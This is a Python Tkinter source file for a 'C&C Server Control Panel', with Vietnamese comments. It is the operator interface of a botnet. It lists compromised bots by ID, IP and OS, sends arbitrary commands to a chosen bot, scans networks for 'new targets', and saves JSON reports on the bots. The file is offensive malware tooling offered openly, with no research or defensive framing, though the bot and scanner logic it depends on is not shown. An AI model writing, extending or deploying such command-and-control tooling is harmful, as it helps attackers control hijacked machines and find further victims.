import tkinter as tk
from tkinter import ttk, scrolledtext
import json
import threading
import queue
from datetime import datetime

class ServerGUI:
    def __init__(self, server):
        self.server = server
        self.root = tk.Tk()
        self.root.title("C&C Server Control Panel")
        self.root.geometry("1200x800")
        
        self.command_queue = queue.Queue()
        self.result_queue = queue.Queue()
        
        self.setup_gui()
        self.start_update_thread()
        
    def setup_gui(self):
        """Thiết lập giao diện"""
        # Main container
        main_container = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL)
        main_container.pack(fill=tk.BOTH, expand=True)
        
        # Left panel - Bot list & Info
        left_panel = ttk.Frame(main_container)
        main_container.add(left_panel)
        
        # Bot list
        bot_frame = ttk.LabelFrame(left_panel, text="Connected Bots")
        bot_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        columns = ('ID', 'IP', 'OS', 'Status')
        self.bot_tree = ttk.Treeview(bot_frame, columns=columns, show='headings')
        for col in columns:
            self.bot_tree.heading(col, text=col)
        self.bot_tree.pack(fill=tk.BOTH, expand=True)
        
        # Bot details
        details_frame = ttk.LabelFrame(left_panel, text="Bot Details")
        details_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.details_text = scrolledtext.ScrolledText(details_frame, height=10)
        self.details_text.pack(fill=tk.BOTH, expand=True)
        
        # Right panel - Control & Output
        right_panel = ttk.Frame(main_container)
        main_container.add(right_panel)
        
        # Control buttons
        control_frame = ttk.LabelFrame(right_panel, text="Controls")
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(control_frame, text="Refresh", command=self.refresh_bots).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Scan Network", command=self.scan_network).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="Generate Report", command=self.generate_report).pack(side=tk.LEFT, padx=5)
        
        # Command input
        cmd_frame = ttk.LabelFrame(right_panel, text="Command")
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.cmd_entry = ttk.Entry(cmd_frame)
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        ttk.Button(cmd_frame, text="Send", command=self.send_command).pack(side=tk.RIGHT, padx=5)
        
        # Output
        output_frame = ttk.LabelFrame(right_panel, text="Output")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.output_text = scrolledtext.ScrolledText(output_frame)
        self.output_text.pack(fill=tk.BOTH, expand=True)
        
        # Status bar
        self.status_var = tk.StringVar()
        status_bar = ttk.Label(self.root, textvariable=self.status_var)
        status_bar.pack(fill=tk.X, padx=5, pady=2)
        
    def start_update_thread(self):
        """Khởi động thread cập nhật GUI"""
        def update_loop():
            while True:
                try:
                    # Cập nhật danh sách bot
                    bots = self.server.botnet.get_bots()
                    self.update_bot_list(bots)
                    
                    # Kiểm tra kết quả lệnh
                    while not self.result_queue.empty():
                        result = self.result_queue.get()
                        self.append_output(result)
                        
                    # Cập nhật status
                    self.status_var.set(f"Server running - {len(bots)} bots connected")
                    
                except Exception as e:
                    print(f"GUI update error: {str(e)}")
                    
                self.root.after(1000)  # Cập nhật mỗi giây
                
        update_thread = threading.Thread(target=update_loop)
        update_thread.daemon = True
        update_thread.start()
        
    def refresh_bots(self):
        """Làm mới danh sách bot"""
        try:
            bots = self.server.botnet.get_bots()
            self.update_bot_list(bots)
            self.status_var.set("Bot list refreshed")
        except Exception as e:
            self.status_var.set(f"Error refreshing bots: {str(e)}")
            
    def update_bot_list(self, bots):
        """Cập nhật danh sách bot trong tree view"""
        # Xóa danh sách cũ
        for item in self.bot_tree.get_children():
            self.bot_tree.delete(item)
            
        # Thêm bot mới
        for bot in bots:
            self.bot_tree.insert(
                '',
                'end',
                values=(
                    bot.id,
                    bot.ip,
                    bot.info.get('os', 'Unknown'),
                    'Connected' if bot.connected else 'Disconnected'
                )
            )
            
    def scan_network(self):
        """Quét mạng tìm mục tiêu mới"""
        try:
            self.status_var.set("Scanning network...")
            targets = self.server.scanner.scan()
            
            # Hiển thị kết quả
            self.append_output("\n=== Network Scan Results ===\n")
            for target in targets:
                self.append_output(f"Found target: {target['ip']} ({target['os']})\n")
                
            self.status_var.set(f"Scan complete - Found {len(targets)} targets")
            
        except Exception as e:
            self.status_var.set(f"Scan error: {str(e)}")
            
    def send_command(self):
        """Gửi lệnh tới bot được chọn"""
        try:
            # Lấy bot được chọn
            selection = self.bot_tree.selection()
            if not selection:
                raise Exception("No bot selected")
                
            bot_id = self.bot_tree.item(selection[0])['values'][0]
            command = self.cmd_entry.get()
            
            # Thêm vào queue
            self.command_queue.put({
                'bot_id': bot_id,
                'command': command
            })
            
            self.cmd_entry.delete(0, tk.END)
            self.status_var.set(f"Command sent to bot {bot_id}")
            
        except Exception as e:
            self.status_var.set(f"Command error: {str(e)}")
            
    def generate_report(self):
        """Tạo báo cáo"""
        try:
            self.status_var.set("Generating report...")
            
            # Thu thập thông tin
            report = {
                'timestamp': datetime.now().isoformat(),
                'server_info': {
                    'host': self.server.host,
                    'port': self.server.port,
                    'uptime': self.server.get_uptime()
                },
                'bots': []
            }
            
            # Thông tin từng bot
            for bot in self.server.botnet.get_bots():
                report['bots'].append({
                    'id': bot.id,
                    'ip': bot.ip,
                    'info': bot.info,
                    'connected': bot.connected,
                    'last_seen': bot.last_seen
                })
                
            # Lưu báo cáo
            filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
                
            self.status_var.set(f"Report saved to {filename}")
            
        except Exception as e:
            self.status_var.set(f"Report error: {str(e)}")
            
    def append_output(self, text):
        """Thêm text vào output"""
        self.output_text.insert(tk.END, text)
        self.output_text.see(tk.END)
        
    def start(self):
        """Khởi động GUI"""
        self.root.mainloop()